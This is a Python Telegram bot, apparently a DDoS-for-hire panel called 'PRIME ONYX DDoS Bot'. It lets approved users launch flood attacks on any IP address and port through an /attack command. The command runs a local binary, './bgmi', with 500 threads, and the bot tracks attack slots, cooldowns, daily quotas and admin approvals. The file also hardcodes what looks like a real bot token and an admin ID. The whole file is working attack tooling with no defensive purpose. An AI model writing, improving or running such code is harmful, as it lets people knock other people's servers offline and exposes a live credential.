import os
import telebot
import logging
import subprocess
import threading
import time
import json
from datetime import datetime, timedelta

logging.basicConfig(level=logging.INFO)
TOKEN = "7637579502:AAGAiIoxJVGOLvile_PBmVumIqmCZ8pUMIk"
ADMIN_IDS = [1347675113]
bot = telebot.TeleBot(TOKEN)

user_attacks = {}
user_cooldowns = {}
active_attacks = {}
attack_counter = 0
attack_lock = threading.Lock()
MAX_ACTIVE_ATTACKS = 5
APPROVED_USERS_FILE = "approved_users.json"

def load_approved():
    try:
        with open(APPROVED_USERS_FILE, 'r') as f:
            return set(json.load(f))
    except:
        return set()

def save_approved():
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(list(APPROVED_USERS), f)

APPROVED_USERS = load_approved()

def is_approved(uid):
    return uid in ADMIN_IDS or uid in APPROVED_USERS

def get_free_slots():
    with attack_lock:
        now = datetime.now()
        return MAX_ACTIVE_ATTACKS - len([a for a in active_attacks.values() if a['end_time'] > now])

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.from_user.id
    name = m.from_user.username or m.from_user.first_name
    slots = get_free_slots()
    if is_approved(uid):
        status = "APPROVED"
    else:
        status = "PENDING APPROVAL"
    msg = f"""🔥 PRIME ONYX DDoS Bot

👤 User: @{name}
📊 Status: {status}

📌 Commands:
/attack IP PORT TIME
/status
/myinfo
/when
/rules
/owner
/canary

🟢 Slot Status: {slots}/{MAX_ACTIVE_ATTACKS} free"""
    bot.reply_to(m, msg)

@bot.message_handler(commands=['attack'])
def attack(m):
    global attack_counter
    uid = m.from_user.id
    name = m.from_user.username or m.from_user.first_name
    
    if not is_approved(uid):
        bot.reply_to(m, f"❌ Access Denied @{name}!\nContact /owner for approval")
        return
    
    if uid in user_cooldowns and datetime.now() < user_cooldowns[uid]:
        remain = int((user_cooldowns[uid] - datetime.now()).seconds)
        bot.reply_to(m, f"⏰ Cooldown! Wait {remain} seconds")
        return
    
    if get_free_slots() <= 0:
        bot.reply_to(m, f"❌ API Error! Max {MAX_ACTIVE_ATTACKS} attacks running.\nSlot Status: 0/{MAX_ACTIVE_ATTACKS} free")
        return
    
    try:
        args = m.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(m, f"✅ Ready to launch attack?\n\nFormat: /attack IP PORT TIME (1-300 sec)\n\n🟢 Slot Status: {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free")
            return
        
        ip, port, dur = args
        
        # IP validation
        parts = ip.split('.')
        if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
            bot.reply_to(m, f"❌ Invalid IP address!\n\n🟢 Slot Status: {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free")
            return
        
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            bot.reply_to(m, f"❌ Invalid port! (1-65535)\n\n🟢 Slot Status: {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free")
            return
        
        duration = int(dur)
        if duration < 1 or duration > 300:
            bot.reply_to(m, f"❌ Invalid duration! (1-300 seconds)\n\n🟢 Slot Status: {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free")
            return
        
        user_attacks[uid] = user_attacks.get(uid, 0) + 1
        user_cooldowns[uid] = datetime.now() + timedelta(seconds=30)
        
        with attack_lock:
            attack_counter += 1
            attack_id = attack_counter
            active_attacks[attack_id] = {
                'user_id': uid, 'username': name, 'target': f"{ip}:{port}",
                'end_time': datetime.now() + timedelta(seconds=duration), 'duration': duration
            }
        
        slots = get_free_slots()
        
        bot.reply_to(m, f"""🚀 Attack Initiated!

🎯 Target: {ip}:{port}
⏰ Duration: {duration}s
🔧 Threads: 500

🟢 Free Slots: {slots}/{MAX_ACTIVE_ATTACKS}""")
        
        t = threading.Thread(target=run_attack, args=(attack_id, ip, int(port), duration, name, uid, m.chat.id))
        t.daemon = True
        t.start()
        
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['status'])
def status(m):
    uid = m.from_user.id
    if not is_approved(uid):
        bot.reply_to(m, "❌ Access Denied!")
        return
    slots = get_free_slots()
    active = len([a for a in active_attacks.values() if a['end_time'] > datetime.now()])
    user_active = []
    for a in active_attacks.values():
        if a['user_id'] == uid and a['end_time'] > datetime.now():
            remain = int((a['end_time'] - datetime.now()).seconds)
            user_active.append(f"• {a['target']} - {remain}s left")
    
    msg = f"""📊 Attack Status

🟢 Free Slots: {slots}/{MAX_ACTIVE_ATTACKS}
⚡ Active Attacks: {active}/{MAX_ACTIVE_ATTACKS}

👤 Your Active Attacks:
{chr(10).join(user_active) if user_active else 'No active attacks'}

📈 Total Today: {user_attacks.get(uid,0)}/50"""
    bot.reply_to(m, msg)

@bot.message_handler(commands=['myinfo'])
def myinfo(m):
    uid = m.from_user.id
    name = m.from_user.username or m.from_user.first_name
    if not is_approved(uid):
        bot.reply_to(m, "❌ Access Denied!\nContact /owner for approval")
        return
    
    msg = f"""👤 User Info

📛 Username: @{name}
🆔 User ID: {uid}
✅ Status: Approved
📊 Today's Attacks: {user_attacks.get(uid,0)}/50
🟢 Slot Status: {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"""
    bot.reply_to(m, msg)

@bot.message_handler(commands=['when'])
def when(m):
    uid = m.from_user.id
    if not is_approved(uid):
        bot.reply_to(m, "❌ Access Denied!")
        return
    
    user_active = []
    for a in active_attacks.values():
        if a['user_id'] == uid and a['end_time'] > datetime.now():
            remain = int((a['end_time'] - datetime.now()).seconds)
            user_active.append(f"🎯 {a['target']} - {remain}s left")
    
    if user_active:
        msg = "⏰ Your Attack Remaining Time\n\n" + "\n".join(user_active)
    else:
        msg = "✅ No active attacks"
    
    msg += f"\n\n🟢 Free Slots: {get_free_slots()}/{MAX_ACTIVE_ATTACKS}"
    bot.reply_to(m, msg)

@bot.message_handler(commands=['rules'])
def rules(m):
    msg = f"""📜 Bot Rules

1️⃣ Use attacks responsibly
2️⃣ Maximum 50 attacks per day
3️⃣ Maximum 300 seconds per attack
4️⃣ 30 seconds cooldown between attacks
5️⃣ Max {MAX_ACTIVE_ATTACKS} concurrent attacks
6️⃣ Don't share bot with others
7️⃣ No attacking educational/government sites

⚠️ Violation may lead to ban!

🟢 Slot Status: {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"""
    bot.reply_to(m, msg)

@bot.message_handler(commands=['owner'])
def owner(m):
    msg = f"""👑 Bot Owner

For approval, support, or queries:
🆔 Admin ID: {ADMIN_IDS[0]}
💬 Contact: @Pk_Chopra

💡 To get approved: Send your User ID to admin

🟢 Slot Status: {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"""
    bot.reply_to(m, msg)

@bot.message_handler(commands=['canary'])
def canary(m):
    msg = f"""🐦 HttpCanary Download

Download HttpCanary for packet capture:
📱 Android: Google Play Store
🔗 Direct: https://httpcanary.com/download

Use it to capture and analyze network packets

🟢 Slot Status: {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"""
    bot.reply_to(m, msg)

@bot.message_handler(commands=['approve'])
def approve(m):
    if m.from_user.id not in ADMIN_IDS:
        bot.reply_to(m, "❌ Admin only command!")
        return
    try:
        args = m.text.split()
        if len(args) < 2:
            bot.reply_to(m, "❌ Usage: /approve <user_id>")
            return
        uid = int(args[1])
        APPROVED_USERS.add(uid)
        save_approved()
        bot.reply_to(m, f"✅ User {uid} approved!\nThey can now use /attack command")
    except:
        bot.reply_to(m, "❌ Invalid User ID!")

@bot.message_handler(commands=['remove'])
def remove(m):
    if m.from_user.id not in ADMIN_IDS:
        bot.reply_to(m, "❌ Admin only command!")
        return
    try:
        uid = int(m.text.split()[1])
        if uid in ADMIN_IDS:
            bot.reply_to(m, "❌ Cannot remove admin!")
            return
        APPROVED_USERS.discard(uid)
        save_approved()
        bot.reply_to(m, f"❌ User {uid} removed!\nApproval revoked.")
    except:
        bot.reply_to(m, "❌ Invalid User ID!")

@bot.message_handler(commands=['reset_TF'])
def reset(m):
    if m.from_user.id not in ADMIN_IDS:
        bot.reply_to(m, "❌ Admin only command!")
        return
    user_attacks.clear()
    user_cooldowns.clear()
    bot.reply_to(m, "🔄 All limits have been reset by ADMIN!")

@bot.message_handler(commands=['slots'])
def slots(m):
    if m.from_user.id not in ADMIN_IDS:
        bot.reply_to(m, "❌ Admin only command!")
        return
    slots = get_free_slots()
    active = get_active_attacks_count()
    msg = f"📊 Server Status\n\n🟢 Free Slots: {slots}/{MAX_ACTIVE_ATTACKS}\n⚡ Active Attacks: {active}/{MAX_ACTIVE_ATTACKS}\n\n"
    for aid, a in active_attacks.items():
        if a['end_time'] > datetime.now():
            remain = int((a['end_time'] - datetime.now()).seconds)
            msg += f"🔹 #{aid}: {a['target']} - {remain}s - @{a['username']}\n"
    bot.reply_to(m, msg)

def get_active_attacks_count():
    with attack_lock:
        return len([a for a in active_attacks.values() if a['end_time'] > datetime.now()])

def run_attack(aid, ip, port, dur, name, uid, cid):
    try:
        cmd = f"./bgmi {ip} {port} {dur} 500"
        print(f"[+] Executing: {cmd}")
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(dur)
        process.terminate()
        slots = get_free_slots()
        bot.send_message(cid, f"✅ Attack Completed!\n\n🎯 Target: {ip}:{port}\n⏰ Duration: {dur}s\n👤 By: @{name}\n\n🟢 Slot Status: {slots}/{MAX_ACTIVE_ATTACKS} free")
    except Exception as e:
        bot.send_message(ADMIN_IDS[0], f"❌ Attack Failed: {e}")
    finally:
        with attack_lock:
            if aid in active_attacks:
                del active_attacks[aid]

def cleanup():
    while True:
        time.sleep(10)
        with attack_lock:
            now = datetime.now()
            expired = [aid for aid, a in active_attacks.items() if a['end_time'] <= now]
            for aid in expired:
                del active_attacks[aid]

threading.Thread(target=cleanup, daemon=True).start()

if __name__ == "__main__":
    print("="*50)
    print("🔥 PRIME ONYX DDoS Bot Starting...")
    print("="*50)
    print(f"📊 Max Attacks: {MAX_ACTIVE_ATTACKS}")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"✅ Approved Users: {len(APPROVED_USERS)}")
    print("="*50)
    print("✅ Bot is running...")
    bot.infinity_polling()